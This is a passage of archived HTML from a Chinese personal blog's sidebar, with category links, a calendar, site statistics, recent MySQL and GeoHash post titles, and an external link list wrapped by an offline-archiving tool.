tppabs="http://i.renjihe.com/blog/index.php?go=category_72" title="创意">创意</a> [20] <a href="feed.php-go=category_72" tppabs="http://i.renjihe.com/blog/feed.php?go=category_72"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_85.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_85" title="星象命理">星象命理</a> [40] <a href="feed.php-go=category_85" tppabs="http://i.renjihe.com/blog/feed.php?go=category_85"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_11.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_11" title="杂项">杂项</a> [50] <a href="feed.php-go=category_11" tppabs="http://i.renjihe.com/blog/feed.php?go=category_11"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_58.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_58" title="记录">记录</a> [26] <a href="feed.php-go=category_58" tppabs="http://i.renjihe.com/blog/feed.php?go=category_58"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_79.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_79" title="心灵鸡汤">心灵鸡汤</a> [78] <a href="feed.php-go=category_79" tppabs="http://i.renjihe.com/blog/feed.php?go=category_79"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_75.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_75" title="文学">文学</a> [9] <a href="feed.php-go=category_75" tppabs="http://i.renjihe.com/blog/feed.php?go=category_75"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_67.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_67" title="其它工程资料">其它工程资料</a> [2] <a href="feed.php-go=category_67" tppabs="http://i.renjihe.com/blog/feed.php?go=category_67"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_84.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_84" title="哲学">哲学</a> [24] <a href="feed.php-go=category_84" tppabs="http://i.renjihe.com/blog/feed.php?go=category_84"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_87.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_87" title="有言">有言</a> [9] <a href="feed.php-go=category_87" tppabs="http://i.renjihe.com/blog/feed.php?go=category_87"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_88.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_88" title="微语录">微语录</a> [15] <a href="feed.php-go=category_88" tppabs="http://i.renjihe.com/blog/feed.php?go=category_88"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_76.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_76" title="置顶">置顶</a> [440] <a href="feed.php-go=category_76" tppabs="http://i.renjihe.com/blog/feed.php?go=category_76"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_86.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_86" title="励志">励志</a> [10] <a href="feed.php-go=category_86" tppabs="http://i.renjihe.com/blog/feed.php?go=category_86"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li><li><a href="index.php-go=category_81.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_81" title="资源管理">资源管理</a> [1] <a href="feed.php-go=category_81" tppabs="http://i.renjihe.com/blog/feed.php?go=category_81"><img src="rss.png" tppabs="http://i.renjihe.com/blog/template/default/images/rss.png" border="0" alt="RSS" title="追踪这个分类的RSS" /></a></li></ul>
</div>
</div><div class="panel">
<h5 onclick='showhidediv("sidebar_calendar");'>日历</h5>
<div class="panel-content" id="sidebar_calendar" style="display: block">
<table id="calendar" cellspacing="1" width="100%">
<tbody><tr><td colspan="7" class="calendar-top">
<a href="index.php-go=archive&cm=9&cy=2015.htm" tppabs="http://i.renjihe.com/blog/index.php?go=archive&cm=9&cy=2015" rel="noindex,nofollow">&lt;</a>
<a href="archive.php.htm" tppabs="http://i.renjihe.com/blog/archive.php" rel="noindex,nofollow"><span class="calendar-year">2016</span></a>
<a href="index.php-go=archive&cm=9&cy=2017.htm" tppabs="http://i.renjihe.com/blog/index.php?go=archive&cm=9&cy=2017" rel="noindex,nofollow">&gt;</a>
	&nbsp;&nbsp;
<a href="index.php-go=archive&cm=8&cy=2016.htm" tppabs="http://i.renjihe.com/blog/index.php?go=archive&cm=8&cy=2016" rel="noindex,nofollow">&lt;</a>
<a href="index.php-go=archive&cm=9&cy=2016.htm" tppabs="http://i.renjihe.com/blog/index.php?go=archive&cm=9&cy=2016" rel="noindex,nofollow"><span class="calendar-month">9</span></a>
<a href="index.php-go=archive&cm=10&cy=2016.htm" tppabs="http://i.renjihe.com/blog/index.php?go=archive&cm=10&cy=2016" rel="noindex,nofollow">&gt;</a>
</td></tr>
<tr class="calendar-weekdays">
	<td class="calendar-weekday-cell">日</td>
	<td class="calendar-weekday-cell">一</td>
	<td class="calendar-weekday-cell">二</td>
	<td class="calendar-weekday-cell">三</td>
	<td class="calendar-weekday-cell">四</td>
	<td class="calendar-weekday-cell">五</td>
	<td class="calendar-weekday-cell">六</td>
</tr>
<tr class="calendar-weekdays"><td class="calendar-sunday"></td><td class="calendar-day"></td><td class="calendar-day"></td><td class="calendar-day"></td><td id="cal1" class="calendar-day"><a href="index.php-go=showday_2016-9-1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=showday_2016-9-1" rel="noindex,nofollow">1</a></td><td id="cal2" class="calendar-day">2</td><td id="cal3" class="calendar-today">3</td></tr><tr class="calendar-weekdays"><td id="cal4" class="calendar-sunday">4</td><td id="cal5" class="calendar-day">5</td><td id="cal6" class="calendar-day">6</td><td id="cal7" class="calendar-day">7</td><td id="cal8" class="calendar-day">8</td><td id="cal9" class="calendar-day">9</td><td id="cal10" class="calendar-saturday">10</td></tr><tr class="calendar-weekdays"><td id="cal11" class="calendar-sunday">11</td><td id="cal12" class="calendar-day">12</td><td id="cal13" class="calendar-day">13</td><td id="cal14" class="calendar-day">14</td><td id="cal15" class="calendar-day">15</td><td id="cal16" class="calendar-day">16</td><td id="cal17" class="calendar-saturday">17</td></tr><tr class="calendar-weekdays"><td id="cal18" class="calendar-sunday">18</td><td id="cal19" class="calendar-day">19</td><td id="cal20" class="calendar-day">20</td><td id="cal21" class="calendar-day">21</td><td id="cal22" class="calendar-day">22</td><td id="cal23" class="calendar-day">23</td><td id="cal24" class="calendar-saturday">24</td></tr><tr class="calendar-weekdays"><td id="cal25" class="calendar-sunday">25</td><td id="cal26" class="calendar-day">26</td><td id="cal27" class="calendar-day">27</td><td id="cal28" class="calendar-day">28</td><td id="cal29" class="calendar-day">29</td><td id="cal30" class="calendar-day">30</td><td class="calendar-saturday"></td></tr>
</tbody></table>
</div>
</div><div class="panel">
<h5 onclick='showhidediv("sidebar_statistics");'>统计</h5>
<div class="panel-content" id="sidebar_statistics" style="display: block">
访问次数 133640<br/>今日访问 1<br/>日志数量 7121<br/><a href="guestbook.php.htm" tppabs="http://i.renjihe.com/blog/guestbook.php">留言数量 2</a><br/>在线人数 1<br/>
</div>
</div><div class="panel">
<h5 onclick='showhidediv("sidebar_entries");'>最新日志</h5>
<div class="panel-content" id="sidebar_entries" style="display: block">
<ul><li class='rowcouple'><a href="read.php-7527.htm" tppabs="http://i.renjihe.com/blog/read.php?7527" title="mysql优化之索引优化">mysql优化之索引优化</a></li><li class='rowodd'><a href="read.php-7526.htm" tppabs="http://i.renjihe.com/blog/read.php?7526" title="Mysql limit 优化，百万至千万级快速分页，--复合索引的引用并应用于轻量级框架&nbsp;&nbsp;">Mysql limit ...</a></li><li class='rowcouple'><a href="read.php-7525.htm" tppabs="http://i.renjihe.com/blog/read.php?7525" title="mysql sql语句执行时间查询">mysql sql语句执...</a></li><li class='rowodd'><a href="read.php-7524.htm" tppabs="http://i.renjihe.com/blog/read.php?7524" title="GeoHash核心原理解析">GeoHash核心原理解...</a></li><li class='rowcouple'><a href="read.php-7523.htm" tppabs="http://i.renjihe.com/blog/read.php?7523" title="如何实现按距离排序、范围查找">如何实现按距离排序、范围...</a></li></ul>
</div>
</div>
				</div>
				<div id="innerSidebarTwo">
					<div class="panel">
<h5 onclick='showhidediv("sidebar_link");'>链接</h5>
<div class="panel-content" id="sidebar_link" style="display: block">
<ul><li><strong>协会</strong></li><li class="indent"><a href="javascript:if(confirm('http://www.siggraph.org/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.siggraph.org/'" tppabs="http://www.siggraph.org/" target="_blank" title="siggraph - ">siggraph</a></li><li class="indent"><a href="javascript:if(confirm('http://www.siggraph.org.cn/Pages/index.aspx  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.siggraph.org.cn/Pages/index.aspx'" tppabs="http://www.siggraph.org.cn/Pages/index.aspx" target="_blank" title="siggraph中国 - ">siggraph中国</a></li><li class="indent"><a href="javascript:if(confirm('http://www.igf.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.igf.com/'" tppabs="http://www.igf.com/" target="_blank" title="独立游戏节 - ">独立游戏节</a></li><li><strong>项目</strong></li><li class="indent"><a href="javascript:if(confirm('http://youyur.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://youyur.com/'" tppabs="http://youyur.com/" target="_blank" title="有鱼 - ">有鱼</a></li><li class="indent"><a href="javascript:if(confirm('http://codecanyon.net/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://codecanyon.net/'" tppabs="http://codecanyon.net/" target="_blank" title="codecanyon - ">codecanyon</a></li><li class="indent"><a href="javascript:if(confirm('http://www.sxsoft.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.sxsoft.com/'" tppabs="http://www.sxsoft.com/" target="_blank" title="软件项目交易网 - ">软件项目交易网</a></li><li class="indent"><a href="javascript:if(confirm('http://www.csto.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.csto.com/'" tppabs="http://www.csto.com/" target="_blank" title="csto - ">csto</a></li><li class="indent"><a href="javascript:if(confirm('http://themeforest.net/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://themeforest.net/'" tppabs="http://themeforest.net/" target="_blank" title="themeforest - ">themeforest</a></li><li class="indent"><a href="javascript:if(confirm('http://www.digitalriver.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.digitalriver.com/'" tppabs="http://www.digitalriver.com/" target="_blank" title="Digital River - ">Digital River</a></li><li class="indent"><a href="javascript:if(confirm('http://www.vworker.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.vworker.com/'" tppabs="http://www.vworker.com/" target="_blank" title="vworker - ">vworker</a></li><li class="indent"><a href="javascript:if(confirm('http://luexiao.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://luexiao.com/'" tppabs="http://luexiao.com/" target="_blank" title="略晓 - ">略晓</a></li><li class="indent"><a href="javascript:if(confirm('http://www.yateshi.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.yateshi.com/'" tppabs="http://www.yateshi.com/" target="_blank" title="雅特士外包网  - ">雅特士外包网 </a></li><li class="indent"><a href="javascript:if(confirm('http://wpappstore.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://wpappstore.com/'" tppabs="http://wpappstore.com/" target="_blank" title="WP App Store - ">WP App Store</a></li><li class="indent"><a href="javascript:if(confirm('http://store.steampowered.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://store.steampowered.com/'" tppabs="http://store.steampowered.com/" target="_blank" title="Steam - ">Steam</a></li><li class="indent"><a href="javascript:if(confirm('http://www.taskcity.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.taskcity.com/'" tppabs="http://www.taskcity.com/" target="_blank" title="TaskCity - ">TaskCity</a></li><li class="indent"><a href="javascript:if(confirm('http://www.istockphoto.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.istockphoto.com/'" tppabs="http://www.istockphoto.com/" target="_blank" title="iStockphoto - ">iStockphoto</a></li><li class="indent"><a href="javascript:if(confirm('http://envato.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://envato.com/'" tppabs="http://envato.com/" target="_blank" title="Envato - ">Envato</a></li><li class="indent"><a href="javascript:if(confirm('https://tutsplus.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='https://tutsplus.com/'" tppabs="https://tutsplus.com/" target="_blank" title="Tuts+ Premium - ">Tuts+ Premium</a></li><li class="indent"><a href="javascript:if(confirm('http://www.sharebank.com.cn/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.sharebank.com.cn/'" tppabs="http://www.sharebank.com.cn/" target="_blank" title="软行天下  - ">软行天下 </a></li><li class="indent"><a href="javascript:if(confirm('http://www.softreg.com.cn/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.softreg.com.cn/'" tppabs="http://www.softreg.com.cn/" target="_blank" title="中国共享软件注册中心 - ">中国共享软件注册中心</a></li><li class="indent"><a href="javascript:if(confirm('https://www.elance.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='https://www.elance.com/'" tppabs="https://www.elance.com/" target="_blank" title="Elance - ">Elance</a></li><li class="indent"><a href="javascript:if(confirm('http://www.freelancer.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.freelancer.com/'" tppabs="http://www.freelancer.com/" target="_blank" title="freelancer - ">freelancer</a></li><li class="indent"><a href="javascript:if(confirm('http://www.bizsofts.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.bizsofts.com/'" tppabs="http://www.bizsofts.com/" target="_blank" title="软件商务网 - ">软件商务网</a></li><li class="indent"><a href="javascript:if(confirm('https://www.odesk.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='https://www.odesk.com/'" tppabs="https://www.odesk.com/" target="_blank" title="oDesk - ">oDesk</a></li><li class="indent"><a href="javascript:if(confirm('http://store.raspberrypi.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://store.raspberrypi.com/'" tppabs="http://store.raspberrypi.com/" target="_blank" title="树莓派商店 - ">树莓派商店</a></li><li><strong>杂项</strong></li><li class="indent"><a href="javascript:if(confirm('http://www.codinghorror.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.codinghorror.com/'" tppabs="http://www.codinghorror.com/" target="_blank" title="codinghorror - ">codinghorror</a></li><li class="indent"><a href="javascript:if(confirm('http://www.fabiensanglard.net/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.fabiensanglard.net/'" tppabs="http://www.fabiensanglard.net/" target="_blank" title="fabiensanglard - ">fabiensanglard</a></li><li class="indent"><a href="javascript:if(confirm('http://www.intel.com/intelpress/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.intel.com/intelpress/'" tppabs="http://www.intel.com/intelpress/" target="_blank" title="英特尔出版社 - ">英特尔出版社</a></li><li class="indent"><a href="javascript:if(confirm('http://www.opencart.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.opencart.com/'" tppabs="http://www.opencart.com/" target="_blank" title="OpenCart - ">OpenCart</a></li><li class="indent"><a href="javascript:if(confirm('http://www.appinn.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.appinn.com/'" tppabs="http://www.appinn.com/" target="_blank" title="小众软件 - ">小众软件</a></li><li class="indent"><a href="javascript:if(confirm('http://renderhjs.net/shoebox/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://renderhjs.net/shoebox/'" tppabs="http://renderhjs.net/shoebox/" target="_blank" title="shoebox工具 - ">shoebox工具</a></li><li><strong>个人</strong></li><li><strong>阅读</strong></li><li class="indent"><a href="javascript:if(confirm('http://huaban.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://huaban.com/'" tppabs="http://huaban.com/" target="_blank" title="花瓣网 - ">花瓣网</a></li><li class="indent"><a href="javascript:if(confirm('http://www.oralstudy.cn/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.oralstudy.cn/'" tppabs="http://www.oralstudy.cn/" target="_blank" title="英语口语学习网 - ">英语口语学习网</a></li><li class="indent"><a href="javascript:if(confirm('http://www.dspguide.com/pdfbook.htm  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.dspguide.com/pdfbook.htm'" tppabs="http://www.dspguide.com/pdfbook.htm" target="_blank" title="DSP Guide - ">DSP Guide</a></li><li><strong>在线文档</strong></li><li class="indent"><a href="javascript:if(confirm('http://help.adobe.com/zh_CN/flex/mobileapps/index.html  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://help.adobe.com/zh_CN/flex/mobileapps/index.html'" tppabs="http://help.adobe.com/zh_CN/flex/mobileapps/index.html" target="_blank" title="Flex移动开发 - ">Flex移动开发</a></li><li class="indent"><a href="javascript:if(confirm('http://help.adobe.com/zh_CN/as3/learn/index.html  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://help.adobe.com/zh_CN/as3/learn/index.html'" tppabs="http://help.adobe.com/zh_CN/as3/learn/index.html" target="_blank" title="Flex AS3 - ">Flex AS3</a></li><li class="indent"><a href="javascript:if(confirm('http://www.adobe.com/cn/devnet.html  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.adobe.com/cn/devnet.html'" tppabs="http://www.adobe.com/cn/devnet.html" target="_blank" title="Adobe开发者中心 - ">Adobe开发者中心</a></li><li class="indent"><a href="javascript:if(confirm('http://help.adobe.com/zh_CN/FlashPlatform/reference/actionscript/3/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://help.adobe.com/zh_CN/FlashPlatform/reference/actionscript/3/'" tppabs="http://help.adobe.com/zh_CN/FlashPlatform/reference/actionscript/3/" target="_blank" title="ActionScript3.0参考 - ">ActionScript3.0参考</a></li><li class="indent"><a href="javascript:if(confirm('http://help.adobe.com/zh_CN/as3/dev/index.html  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://help.adobe.com/zh_CN/as3/dev/index.html'" tppabs="http://help.adobe.com/zh_CN/as3/dev/index.html" target="_blank" title="ActionScript 3.0 - ">ActionScript 3.0</a></li><li class="indent"><a href="javascript:if(confirm('http://help.adobe.com/zh_CN/air/build/index.html  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://help.adobe.com/zh_CN/air/build/index.html'" tppabs="http://help.adobe.com/zh_CN/air/build/index.html" target="_blank" title="AIR - ">AIR</a></li><li class="indent"><a href="javascript:if(confirm('http://www.ppurl.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.ppurl.com/'" tppabs="http://www.ppurl.com/" target="_blank" title="皮皮书屋 - ">皮皮书屋</a></li><li class="indent"><a href="javascript:if(confirm('http://science.scileaf.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://science.scileaf.com/'" tppabs="http://science.scileaf.com/" target="_blank" title="四叶科学百科 - ">四叶科学百科</a></li><li><strong>临时</strong></li><li class="indent"><a href="javascript:if(confirm('http://www.uisdc.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.uisdc.com/'" tppabs="http://www.uisdc.com/" target="_blank" title="优设 - ">优设</a></li><li class="indent"><a href="javascript:if(confirm('http://www.genesis-3d.com.cn/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.genesis-3d.com.cn/'" tppabs="http://www.genesis-3d.com.cn/" target="_blank" title="genesis-3d - ">genesis-3d</a></li><li class="indent"><a href="javascript:if(confirm('http://designlol.net/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://designlol.net/'" tppabs="http://designlol.net/" target="_blank" title="designlol - ">designlol</a></li></ul>
</div>
</div><div class="panel">
<h5 onclick='showhidediv("sidebar_misc");'>其他</h5>
<div class="panel-content" id="sidebar_misc" style="display: block">
<a href="login.php.htm" tppabs="http://i.renjihe.com/blog/login.php">登入</a><br/><a href="login.php-job=register.htm" tppabs="http://i.renjihe.com/blog/login.php?job=register">注册</a><br/>RSS： <a href="feed.php" tppabs="http://i.renjihe.com/blog/feed.php">日志</a> | <a href="feed.php-go=comment.htm" tppabs="http://i.renjihe.com/blog/feed.php?go=comment">评论</a><br/>编码：UTF-8<br/><a href="javascript:if(confirm('http://validator.w3.org/check?uri=referer  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://validator.w3.org/check?uri=referer'" tppabs="http://validator.w3.org/check?uri=referer" target="_blank">XHTML 1.0</a>
</div>
</div>
				</div>
				<div id="innerSidebarFooter">
				 Powered by <a href="javascript:if(confirm('http://www.bo-blog.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.bo-blog.com/'" tppabs="http://www.bo-blog.com/" target="_blank">Bo-Blog 2.1.1 Release</a><span id="footer-security"><a href="javascript:if(confirm('http://www.cnbct.org/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://www.cnbct.org/'" tppabs="http://www.cnbct.org/" target="_blank" title="Code detection by Bug.Center.Team"><img src="detect.gif" tppabs="http://i.renjihe.com/blog/images/others/detect.gif" alt="Code detection by Bug.Center.Team" border="0" /></a></span>
				<div id="processtime">
				</div>
				</div>
			</div>
		</div>
	</div>
		<div id="footer">
		</div>
	</div>
</div>
<script type="text/javascript">
loadSidebar();
</script>
<script type='text/javascript'>
//<![CDATA[
if (document.getElementById('processtime')) document.getElementById('processtime').innerHTML="<span class='runtimedisplay'>Run in 285 ms, 4 Queries.</span>";
//]]>
</script></body>
</html>